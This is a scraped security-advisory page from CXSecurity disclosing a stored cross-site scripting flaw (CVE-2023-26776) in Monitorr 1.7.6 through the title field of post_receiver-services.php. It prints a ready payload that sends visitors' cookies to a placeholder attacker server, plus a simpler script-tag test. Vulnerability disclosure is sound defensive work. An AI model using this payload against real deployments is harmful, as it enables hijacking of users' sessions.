---
title: Monitorr 1.7.6 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023040020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-06
fetch_date: 2025-10-04T11:30:05.999334
---

# Monitorr 1.7.6 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Monitorr 1.7.6 Cross Site Scripting** **2023.04.05**  Credit:  **[Achuth V P](https://cxsecurity.com/author/Achuth%2BV%2BP/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-26776](https://cxsecurity.com/cveshow/CVE-2023-26776/ "Click to see CVE-2023-26776")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Monitorr v1.7.6 - Cross Site Scripting
# CVE: CVE-2023-26776
# Exploit Author: Achuth V P (retrymp3)
# Date: February 09, 2023
# Vendor Homepage: https://github.com/Monitorr/
# Software Link: https://github.com/Monitorr/Monitorr
# Tested on: Ubuntu
# Version: v1.7.6
# Exploit Description: Cross Site Scripting vulnerability found in Monitorr v.1.7.6 allows a remote attacker to execute arbitrary code via the title parameter of the post\_receiver-services.php file.
Attacker can create a service configuration at <base-url>/assets/php/post\_receiver-services.php with the title of the service being something like; <script>document.location="<your-server>?cookie="document.cookie</script> or just <script>document.cookie</script>
The injected script tag is executed everytime the home page is loaded.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040020)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top